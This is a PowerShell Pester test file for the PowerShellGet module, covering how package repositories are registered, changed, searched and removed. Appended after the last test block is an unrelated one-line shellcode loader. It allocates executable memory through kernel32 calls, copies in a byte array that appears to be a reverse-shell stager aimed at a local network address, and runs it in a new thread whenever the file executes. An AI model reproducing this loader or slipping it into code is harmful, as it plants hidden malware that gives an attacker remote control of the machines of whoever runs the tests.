



. "$PSScriptRoot\PSGetTests.Manifests.ps1"
. "$PSScriptRoot\PSGetTests.Generators.ps1"

function SuiteSetup {
    Import-Module "$PSScriptRoot\PSGetTestUtils.psm1" -WarningAction SilentlyContinue
    Import-Module "$PSScriptRoot\Asserts.psm1" -WarningAction SilentlyContinue

    $script:ProgramFilesModulesPath = Get-AllUsersModulesPath
    $script:MyDocumentsModulesPath = Get-CurrentUserModulesPath
    $script:PSGetLocalAppDataPath = Get-PSGetLocalAppDataPath
    $script:TempPath = Get-TempPath
    $script:BuiltInModuleSourceName = "PSGallery"

    $script:URI200OK = "http://go.microsoft.com/fwlink/?LinkID=533903&clcid=0x409"
    $script:URI404NotFound = "http://go.microsoft.com/fwlink/?LinkID=533902&clcid=0x409"

    
    Install-NuGetBinaries

    $script:PowerShellGetModuleInfo = Import-Module PowerShellGet -Global -Force -PassThru

    Import-LocalizedData  script:LocalizedData -filename PSGet.Resource.psd1 -BaseDirectory $PowerShellGetModuleInfo.ModuleBase

    
    $script:moduleSourcesFilePath= Join-Path $script:PSGetLocalAppDataPath "PSRepositories.xml"
    $script:moduleSourcesBackupFilePath = Join-Path $script:PSGetLocalAppDataPath "PSRepositories.xml_$(get-random)_backup"
    if(Test-Path $script:moduleSourcesFilePath)
    {
        Rename-Item $script:moduleSourcesFilePath $script:moduleSourcesBackupFilePath -Force
    }

    $script:TestModuleSourceUri = ''
    GetAndSet-PSGetTestGalleryDetails -PSGallerySourceUri ([REF]$script:TestModuleSourceUri)

    
    $script:TestModuleSourceName = "PSGetTestModuleSource"
    Register-PSRepository -Name $script:TestModuleSourceName -SourceLocation $script:TestModuleSourceUri -InstallationPolicy Trusted

    $repo = Get-PSRepository -Name $script:BuiltInModuleSourceName -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
    if($repo)
    {
        Set-PSRepository -Name $script:BuiltInModuleSourceName -InstallationPolicy Trusted -ErrorAction SilentlyContinue
    }
    else
    {
        Register-PSRepository -Default -InstallationPolicy Trusted
    }

    $modSource = Get-PSRepository -Name $script:TestModuleSourceName
    AssertEquals $modSource.SourceLocation $script:TestModuleSourceUri "Test module source is not set properly"

    
    $script:TempModulesPath= Join-Path $script:TempPath "PSGet_$(Get-Random)"
    $null = New-Item -Path $script:TempModulesPath -ItemType Directory -Force
}

function SuiteCleanup {
    if(Test-Path $script:moduleSourcesBackupFilePath)
    {
        Move-Item $script:moduleSourcesBackupFilePath $script:moduleSourcesFilePath -Force
    }
    else
    {
        Unregister-PSRepository -Name $script:TestModuleSourceName
    }

    
    $null = Import-PackageProvider -Name PowerShellGet -Force

    RemoveItem $script:TempModulesPath
}

Describe PowerShell.PSGet.ModuleSourceTests -Tags 'BVT', 'InnerLoop' {

    BeforeAll {
        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    
    It RegisterAngGetModuleSource {

        $Name = 'MyTestModSourceForRegisterAngGet'
        $Location = 'https://www.nuget.org/api/v2/'

        Register-PSRepository -Default -ErrorAction SilentlyContinue

        try {
            Register-PSRepository -Name $Name -SourceLocation $Location
            $moduleSource = Get-PSRepository -Name $Name
            $allModuleSources = Get-PSRepository
            $defaultModuleSourceDetails = Get-PSRepository -Name $script:BuiltInModuleSourceName

            AssertEquals $moduleSource.Name $Name "The module source name is not same as the registered name"
            AssertEquals $moduleSource.SourceLocation $Location "The module source location is not same as the registered location"

            Assert (Test-Path $script:moduleSourcesFilePath) "Missing $script:moduleSourcesFilePath file after module source registration"

            Assert ($allModuleSources.Count -ge 3) "ModuleSources count should be >=3 with registed module source along with default PSGallery Source, $allModuleSources"

            AssertEquals $defaultModuleSourceDetails.Name $script:BuiltInModuleSourceName "The default module source name is not same as the expected module source name"
        }
        finally {
            Get-PSRepository -Name $Name -ErrorAction SilentlyContinue | Unregister-PSRepository
        }
    }

    
    It RegisterSMBShareRepository {

        $Name = 'MyTestModSource'
        $Location = $script:TempModulesPath
        try {
            Register-PSRepository -Name $Name -SourceLocation $Location -PublishLocation $Location
            $repo = Get-PSRepository -Name $Name

            AssertEquals $repo.Name $Name "The repository name is not same as the registered name. Actual: $($repo.Name), Expected: $Name"
            AssertEquals $repo.SourceLocation $Location "The SourceLocation is not same as the registered SourceLocation. Actual: $($repo.SourceLocation), Expected: $Location"
            AssertEquals $repo.PublishLocation $Location "The PublishLocation is not same as the registered PublishLocation. Actual: $($repo.PublishLocation), Expected: $Location"
        }
        finally {
            Get-PSRepository -Name $Name | Unregister-PSRepository
        }
    }

    
    It SetPSRepositoryWithSMBSharePath {

        $Name = 'MyTestModSource'
        $Location = $script:TempModulesPath
        try {
            Register-PSRepository -Name $Name -SourceLocation $Location
            Set-PSRepository -Name $Name -SourceLocation $Location -PublishLocation $Location
            $repo = Get-PSRepository -Name $Name

            AssertEquals $repo.Name $Name "The repository name is not same as the registered name. Actual: $($repo.Name), Expected: $Name"
            AssertEquals $repo.SourceLocation $Location "The SourceLocation is not same as the registered SourceLocation. Actual: $($repo.SourceLocation), Expected: $Location"
            AssertEquals $repo.PublishLocation $Location "The PublishLocation is not same as the registered PublishLocation. Actual: $($repo.PublishLocation), Expected: $Location"
        }
        finally {
            Get-PSRepository -Name $Name | Unregister-PSRepository
        }
    }

    
    It UnregisterModuleSource {

        $Name = 'MyTestModSource'
        $Location = 'https://www.nuget.org/api/v2/'

        Register-PSRepository -Name $Name -SourceLocation $Location
        Unregister-PSRepository -Name $Name

        $expectedFullyQualifiedErrorId = 'SourceNotFound,Microsoft.PowerShell.PackageManagement.Cmdlets.GetPackageSource'

        AssertFullyQualifiedErrorIdEquals -scriptblock {Get-PSRepository -Name $Name} `
            -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
    }
}
Describe PowerShell.PSGet.ModuleSourceTests.P1 -Tags 'P1','OuterLoop' {

    BeforeAll {
        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    
    It RegisterPSRepositoryWithInvalidSMBShareSourceLocation {

        $Name='MyTestModSource'
        $Location = Join-Path $script:TempPath 'DirNotAvailable'
        AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name $Name -SourceLocation $Location} `
                                          -expectedFullyQualifiedErrorId "PathNotFound,Register-PSRepository"
    }

    
    It RegisterPSRepositoryWithInvalidSMBSharePublishLocation {

        $Name='MyTestModSource'
        $Location=$script:TempModulesPath
        $PublishLocation = Join-Path $script:TempPath 'DirNotAvailable'
        AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name $Name -SourceLocation $Location -PublishLocation $PublishLocation} `
                                          -expectedFullyQualifiedErrorId "PathNotFound,Add-PackageSource,Microsoft.PowerShell.PackageManagement.Cmdlets.RegisterPackageSource"
    }

    
    It SetPSRepositoryWithInvalidSMBShareSourceLocation {

        $Name='MyTestModSource'
        $Location=$script:TempModulesPath
        $Location2 = Join-Path $script:TempPath 'DirNotAvailable'
        try
        {
            Register-PSRepository -Name $Name -SourceLocation $Location
            AssertFullyQualifiedErrorIdEquals -scriptblock {Set-PSRepository -Name $Name -SourceLocation $Location2} `
                                              -expectedFullyQualifiedErrorId "PathNotFound,Set-PSRepository"
        }
        finally
        {
            Get-PSRepository -Name $Name | Unregister-PSRepository
        }
    }

    
    It SetPSRepositoryWithInvalidSMBSharePublishLocation {

        $Name='MyTestModSource'
        $Location=$script:TempModulesPath
        $Location2 = Join-Path $script:TempPath 'DirNotAvailable'
        try
        {
            Register-PSRepository -Name $Name -SourceLocation $Location -PublishLocation $Location
            AssertFullyQualifiedErrorIdEquals -scriptblock {Set-PSRepository -Name $Name -SourceLocation $Location -PublishLocation $Location2} `
                                              -expectedFullyQualifiedErrorId "PathNotFound,Add-PackageSource,Microsoft.PowerShell.PackageManagement.Cmdlets.SetPackageSource"
        }
        finally
        {
            Get-PSRepository -Name $Name | Unregister-PSRepository
        }
    }

    
    It GetModuleSourceWithWildCards {
        $Name='MyTestModSource'
        $Location='https://www.nuget.org/api/v2/'
        try
        {
            Register-PSRepository -Name $Name -SourceLocation $Location
            $moduleSource = Get-PSRepository -Name 'MyTestModS*rce'

            AssertEquals $moduleSource.Name $Name "The module source name is not same as the registered name"
            AssertEquals $moduleSource.SourceLocation $Location "The module source location is not same as the registered location"

            Assert (Test-Path $script:moduleSourcesFilePath) "Missing $script:moduleSourcesFilePath file after module source registration"
        }
        finally
        {
            Get-PSRepository -Name $Name | Unregister-PSRepository
        }
    }

    
    It RegisterModuleSourceWithSameName {
        $Name='MyTestModSource'
        $Location='https://www.nuget.org/api/v2/'
        try
        {
            Register-PSRepository -Name $Name -SourceLocation $Location

            AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name $Name -SourceLocation $Location} `
                                              -expectedFullyQualifiedErrorId 'PackageSourceExists,Microsoft.PowerShell.PackageManagement.Cmdlets.RegisterPackageSource'
        }
        finally
        {
            Get-PSRepository -Name $Name | Unregister-PSRepository
        }
    }

    
    It RegisterModuleSourceWithAlreadyRegisteredLocation {
        $Name='MyTestModSource'
        $Location='https://www.nuget.org/api/v2/'
        try
        {
            Register-PSRepository -Name $Name -SourceLocation $Location

            $expectedFullyQualifiedErrorId = 'RepositoryAlreadyRegistered,Add-PackageSource,Microsoft.PowerShell.PackageManagement.Cmdlets.RegisterPackageSource'

            AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name 'MyTestModSource2' -SourceLocation $Location} `
                                              -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
        }
        finally
        {
            Get-PSRepository -Name $Name | Unregister-PSRepository
        }
    }

    
    It RegisterModuleSourceWithNotAvailableLocation {

        $expectedFullyQualifiedErrorId = 'InvalidWebUri,Register-PSRepository'

        AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name myNuGetSource -SourceLocation https://www.nonexistingcompany.com/api/v2/} `
                                    -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
    }

    
    It RegisterModuleSourceWithNotAvailableLocation2 {

        $expectedFullyQualifiedErrorId = 'InvalidWebUri,Register-PSRepository'

        AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name myNuGetSource2 -SourceLocation https://www.nonexistingcompany.com} `
                                          -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
    }

    
    It RegisterModuleSourceWithInvalidWebUri {

        $expectedFullyQualifiedErrorId = 'PathNotFound,Register-PSRepository'

        AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name myNuGetSource1 -SourceLocation myget.org/F/powershellgetdemo} `
                                          -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
    }

    
    It RegisterModuleSourceWithWildCardInName {

        $expectedFullyQualifiedErrorId = 'RepositoryNameContainsWildCards,Add-PackageSource,Microsoft.PowerShell.PackageManagement.Cmdlets.RegisterPackageSource'

        AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name my*NuGetSource -SourceLocation https://www.myget.org/F/powershellgetdemo} `
                                          -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
    }

    
    It GetNonRegisteredModuleSource {

        $expectedFullyQualifiedErrorId = 'SourceNotFound,Microsoft.PowerShell.PackageManagement.Cmdlets.GetPackageSource'

        AssertFullyQualifiedErrorIdEquals -scriptblock {Get-PSRepository -Name 'MyTestModSourceNotRegistered'} `
                                          -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
    }

    
    It GetNonRegisteredModuleSourceNameWithWildCards {
        $moduleSources = Get-PSRepository -Name 'MyTestModSourceNotRegiste*ed' -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        AssertNull $moduleSources "Get-PSRepository should not return the $moduleSources module source"
    }

    
    It UnregisterModuleSourceWithWildCards {
        $Name='MyTestModSource'
        $Location='https://www.nuget.org/api/v2/'
        try
        {
            Register-PSRepository -Name $Name -SourceLocation $Location

            AssertFullyQualifiedErrorIdEquals -scriptblock {Unregister-PSRepository -Name 'MyTestMo*ource'} `
                                              -expectedFullyQualifiedErrorId 'RepositoryNameContainsWildCards,Unregister-PSRepository'
        }
        finally
        {
            Get-PSRepository $Name -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Unregister-PSRepository
        }
    }

    
    It UnregisterBuiltinModuleSource {
        try {
            Unregister-PSRepository -Name $script:BuiltInModuleSourceName

            $expectedFullyQualifiedErrorId = 'SourceNotFound,Microsoft.PowerShell.PackageManagement.Cmdlets.GetPackageSource'
            AssertFullyQualifiedErrorIdEquals -scriptblock {Get-PSRepository -Name $script:BuiltInModuleSourceName} `
                                              -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId

            $expectedFullyQualifiedErrorId = 'PSGalleryNotFound,Publish-Module'
            AssertFullyQualifiedErrorIdEquals -scriptblock {Publish-Module -Name MyTempModule} `
                                              -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
        }
        finally {
            Register-PSRepository -Default -InstallationPolicy Trusted
        }
    } `
    -Skip:$($PSEdition -eq 'Core')

    
    It UnregisterNotRegisteredModuleSource {

        $expectedFullyQualifiedErrorId = 'SourceNotFound,Microsoft.PowerShell.PackageManagement.Cmdlets.UnregisterPackageSource'

        AssertFullyQualifiedErrorIdEquals -scriptblock {Unregister-PSRepository -Name "NonAvailableModuleSource"} `
                                          -expectedFullyQualifiedErrorId $expectedFullyQualifiedErrorId
    }

    It RegisterPSRepositoryShouldFailWithPSModuleAsPMProviderName {
        AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PSRepository -Name Foo -SourceLocation $script:TempPath -PackageManagementProvider PowerShellGet} `
                                          -expectedFullyQualifiedErrorId "InvalidPackageManagementProviderValue,Register-PSRepository"
    }

    It SetPSRepositoryShouldFailWithPSModuleAsPMProviderName {
        AssertFullyQualifiedErrorIdEquals -scriptblock {Set-PSRepository -Name PSGallery -PackageManagementProvider PowerShellGet} `
                                          -expectedFullyQualifiedErrorId "InvalidPackageManagementProviderValue,Set-PSRepository"
    }

    It RegisterPackageSourceShouldFailWithPSModuleAsPMProviderName {
        AssertFullyQualifiedErrorIdEquals -scriptblock {Register-PackageSource -ProviderName PowerShellGet -Name Foo -Location $script:TempPath -PackageManagementProvider PowerShellGet} `
                                          -expectedFullyQualifiedErrorId "InvalidPackageManagementProviderValue,Add-PackageSource,Microsoft.PowerShell.PackageManagement.Cmdlets.RegisterPackageSource"
    }
}

Describe PowerShell.PSGet.FindModule.ModuleSourceTests.P1 -Tags 'P1','OuterLoop' {

    
    
    if($IsMacOS) {
        return
    }

    BeforeAll {
        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    
    $ParameterSets = Get-FindModuleWithSourcesParameterSets
    $ParameterSetCount = $ParameterSets.Count
    $i = 1
    foreach ($inputParameters in $ParameterSets)
    {
        Write-Verbose -Message "Combination 
        Write-Verbose -Message "$($inputParameters | Out-String)"
        Write-Progress -Activity "Combination $i out of $ParameterSetCount" -PercentComplete $(($i/$ParameterSetCount) * 100)

        $scriptBlock = $null
        if($inputParameters.Name -and $inputParameters.Source)
        {
            $scriptBlock = { Find-Module -Name $inputParameters.Name -Repository $inputParameters.Source }.GetNewClosure()
        }
        elseif($inputParameters.Name)
        {
            $scriptBlock = { Find-Module -Name $inputParameters.Name }.GetNewClosure()
        }
        elseif($inputParameters.Source)
        {
            $scriptBlock = { Find-Module -Repository $inputParameters.Source }.GetNewClosure()
        }
        else
        {
            $scriptBlock = { Find-Module }
        }

        It "FindModuleWithModuleSourcesTests - Combination $i/$ParameterSetCount" {
            if($inputParameters.PositiveCase)
            {
                $res = Invoke-Command -ScriptBlock $scriptBlock

                if($inputParameters.ExpectedModuleCount -gt 1)
                {
                    Assert ($res.Count -ge $inputParameters.ExpectedModuleCount) "Combination 
                }
                else
                {
                    AssertEqualsCaseInsensitive $res.Name $inputParameters.Name "Combination 
                }
            }
            else
            {
                AssertFullyQualifiedErrorIdEquals -scriptblock $scriptBlock -expectedFullyQualifiedErrorId $inputParameters.FullyQualifiedErrorID
            }
        }

        $i = $i+1
    }
}

Describe PowerShell.PSGet.InstallModule.ModuleSourceTests.P1 -Tags 'P1','OuterLoop' {

    
    
    if($IsMacOS) {
        return
    }

    BeforeAll {
        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    
    $ParameterSets = Get-InstallModuleWithSourcesParameterSets
    $ParameterSetCount = $ParameterSets.Count
    $i = 1
    foreach ($inputParameters in $ParameterSets)
    {
        Write-Verbose -Message "Combination 
        Write-Verbose -Message "$($inputParameters | Out-String)"
        Write-Progress -Activity "Combination $i out of $ParameterSetCount" -PercentComplete $(($i/$ParameterSetCount) * 100)

        $scriptBlock = $null
        if($inputParameters.Source)
        {
            $scriptBlock = { Install-Module -Name $inputParameters.Name -Repository $inputParameters.Source }.GetNewClosure()
        }
        else
        {
            $scriptBlock = { Install-Module -Name $inputParameters.Name }.GetNewClosure()
        }

        It "InstallModuleWithModuleSourcesTests - Combination $i/$ParameterSetCount" {
            try {
                if($inputParameters.PositiveCase)
                {
                    Invoke-Command -ScriptBlock $scriptBlock

                    $res = Get-Module -ListAvailable -Name $inputParameters.Name

                    AssertEqualsCaseInsensitive $res.Name $inputParameters.Name "Combination 
                }
                else
                {
                    AssertFullyQualifiedErrorIdEquals -scriptblock $scriptBlock -expectedFullyQualifiedErrorId $inputParameters.FullyQualifiedErrorID
                }
            } finally {
                PSGetTestUtils\Uninstall-Module $inputParameters.Name
            }
        }

        $i = $i+1
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

